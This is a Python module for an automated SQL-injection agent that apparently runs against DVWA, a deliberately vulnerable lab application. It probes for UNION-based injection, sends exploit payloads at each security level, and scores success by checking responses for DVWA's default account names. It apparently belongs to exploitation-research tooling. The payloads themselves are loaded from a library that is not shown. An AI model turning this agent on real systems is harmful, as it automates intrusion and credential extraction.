"""SQLi Union-based injection agent with real HTTP execution."""

from __future__ import annotations

import logging
from typing import Any

from agents.agent_telemetry import exploit_event, probe_event, score_event
from agents.state_utils import already_tried_payloads, candidate_payloads_for_stage, chain_check as _chain_check, make_update, normalize_security_level
from core.state import ExploitationState, MODULE_TO_KG_NODE
from foundation.payload_library import PayloadLibrary
from foundation.session_manager import DVWASession
from foundation.verifier import Verifier

logger = logging.getLogger(__name__)

AGENT_ID = "sqli_union"
MODULE_PATH = "/vulnerabilities/sqli/"
SESSION_INPUT_PATH = "/vulnerabilities/sqli/session-input.php"
HIGH_RESULT_PATH = "/vulnerabilities/sqli/"
_PROBE_OBSERVATION_KEY = "union_select_possible"

# Structural signals: page contains result table columns
_STRUCTURAL_SIGNALS = ["First name", "Surname"]
# Content signals: extracted credential data present
_CONTENT_SIGNALS = ["admin", "password", "gordonb", "pablo", "smithy"]
_SIGNALS = _STRUCTURAL_SIGNALS + _CONTENT_SIGNALS


def _request_high_via_session(session: DVWASession, payload: str):
    """Store a high-level payload, then reload the page that renders results."""
    session.post(SESSION_INPUT_PATH, data={"id": payload})
    return session.get(HIGH_RESULT_PATH)


def _request(session: DVWASession, security_level: str, payload: str):
    """Submit a SQLi form using the method exposed by the DVWA level."""
    request_data = {"id": payload, "Submit": "Submit"}
    if security_level == "medium":
        return session.post(MODULE_PATH, data=request_data)
    if security_level == "high":
        return _request_high_via_session(session, payload)
    return session.get(MODULE_PATH, params=request_data)


def _probe_preconditions(
    session: DVWASession,
    payloads: list[str],
    already_tried: set[str],
    security_level: str = "low",
) -> tuple[bool, list[str], dict[str, bool], list[dict]]:
    """Send probe payloads to detect if UNION SELECT is possible.

    Returns (precondition_met, tried_payloads, observations, telemetry_events).
    """
    observations: dict[str, bool] = {}
    tried: list[str] = []
    events: list[dict] = []
    verifier = Verifier()
    sent_any = False

    for payload in payloads:
        if payload in already_tried:
            continue
        sent_any = True
        tried.append(payload)
        try:
            resp = _request(session, security_level, payload)
            events.append(probe_event(AGENT_ID, payload, resp.status_code, True))
            result = verifier.contains_any(resp.text, _SIGNALS)
            if resp.status_code == 200 and result.ok:
                observations[_PROBE_OBSERVATION_KEY] = True
                return True, tried, observations, events
        except Exception as exc:
            logger.warning("[%s] PROBE request failed: %s", AGENT_ID, exc)
            events.append(probe_event(AGENT_ID, payload, None, False))

    if not sent_any:
        # Don't overwrite prior observation if we didn't send any requests
        return False, tried, {}, events
    observations[_PROBE_OBSERVATION_KEY] = False
    return False, tried, observations, events


def _attempt_exploit(
    session: DVWASession,
    payloads: list[str],
    already_tried: set[str],
    security_level: str = "low",
) -> tuple[int, list[str], list[str], list[dict]]:
    """Try exploit payloads. Returns (score, tried, confirmed_vulns, events)."""
    tried: list[str] = []
    events: list[dict] = []
    confirmed: list[str] = []
    score = 0
    verifier = Verifier()

    for payload in payloads:
        if payload in already_tried:
            continue
        tried.append(payload)
        try:
            resp = _request(session, security_level, payload)
            events.append(exploit_event(AGENT_ID, payload, resp.status_code, True))
            if resp.status_code == 200:
                body = resp.text.lower()
                # Full exploit: credentials appear in response
                # Medium uses level-scoped UNION variants that cover the
                # filtered column-count and LIMIT forms; the evidence gate
                # remains identical for every security level.
                if ("first name" in body or "surname" in body) and \
                   ("admin" in body or "gordonb" in body or "pablo" in body):
                    score = max(score, 3)
                    confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
                    break
                # Partial: page renders with data but no clear credential extraction
                if "first name" in body or "surname" in body:
                    score = max(score, 2)
        except Exception as exc:
            logger.warning("[%s] EXPLOIT request failed: %s", AGENT_ID, exc)
            events.append(exploit_event(AGENT_ID, payload, None, False))

    return score, tried, confirmed, events

def sqli_union_agent(state: ExploitationState) -> dict[str, Any]:
    """Execute the SQL injection UNION static method agent.

    Reads validated probe and exploit payload candidates, target/session
    configuration, previously tried payloads, and current observations from
    `ExploitationState`. The agent performs DVWA HTTP requests, records tried
    payloads, returns monotonic observations, updates method and payload scores,
    confirms `sqli_union_confirmed` on evidence, and runs the shared chain
    check when exploitation succeeds.

    Args:
        state: Current shared LangGraph state.

    Returns:
        Partial state update for scores, observations, tried payloads,
        confirmed vulnerabilities, achieved outcomes, and telemetry events.
    """
    target_url = state.get("target_url", "")
    security_level = normalize_security_level(state.get("security_level"))

    if not target_url:
        return make_update(state=state, module_name=AGENT_ID, score=0, tried_payloads=[])

    session = DVWASession(target_url)
    try:
        if not session.login():
            return make_update(
                state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
                failure_agents=[AGENT_ID],
            )
        session.set_security_level(security_level)

        already_tried = already_tried_payloads(state, AGENT_ID)
        confirmed_vulns: list[str] = []
        achieved_outcomes: list[str] = []
        score = 0
        telemetry_events: list[dict[str, Any]] = []
        all_tried: list[str] = []
        observations: dict[str, bool] = {}

        # Stage 1: PROBE
        probe_payloads = candidate_payloads_for_stage(state, AGENT_ID, security_level, "probe")
        probe_ok, tried, probe_obs, probe_events = _probe_preconditions(
            session, probe_payloads, already_tried, security_level
        )
        all_tried.extend(tried)
        telemetry_events.extend(probe_events)
        observations.update(probe_obs)

        if not probe_ok:
            update = make_update(
                state=state, module_name=AGENT_ID, score=0,
                tried_payloads=all_tried, telemetry_events=telemetry_events,
            )
            update["observations"] = observations
            return update

        score = max(score, 1)

        # Stage 2: EXPLOIT
        all_exploit = candidate_payloads_for_stage(state, AGENT_ID, security_level, "exploit")

        exploit_score, tried, confirmed, exploit_events = _attempt_exploit(
            session, all_exploit, already_tried | set(all_tried), security_level
        )
        all_tried.extend(tried)
        telemetry_events.extend(exploit_events)
        score = max(score, exploit_score)
        confirmed_vulns.extend(confirmed)
        # UNION confirmation requires visible account-like data in the response,
        # so this is evidence for the enabling outcome as well as the method node.
        if confirmed_vulns:
            achieved_outcomes.append("credentials_extracted")

        # Stage 3: CHAIN CHECK
        if confirmed_vulns:
            chain_score, chain_achieved = _chain_check(confirmed_vulns[0], state)
            if chain_score >= 4:
                score = max(score, chain_score)
                achieved_outcomes.extend(chain_achieved)

        telemetry_events.append(score_event(AGENT_ID, score, confirmed_vulns, achieved_outcomes))

        update = make_update(
            state=state, module_name=AGENT_ID, score=score,
            tried_payloads=all_tried,
            confirmed_vulns=confirmed_vulns or None,
            achieved_outcomes=achieved_outcomes or None,
            telemetry_events=telemetry_events,
        )
        update["observations"] = observations
        return update
    except Exception as exc:
        logger.warning("[%s] Session or execution failed: %s", AGENT_ID, exc)
        return make_update(
            state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
            failure_agents=[AGENT_ID],
        )
    finally:
        session.close()
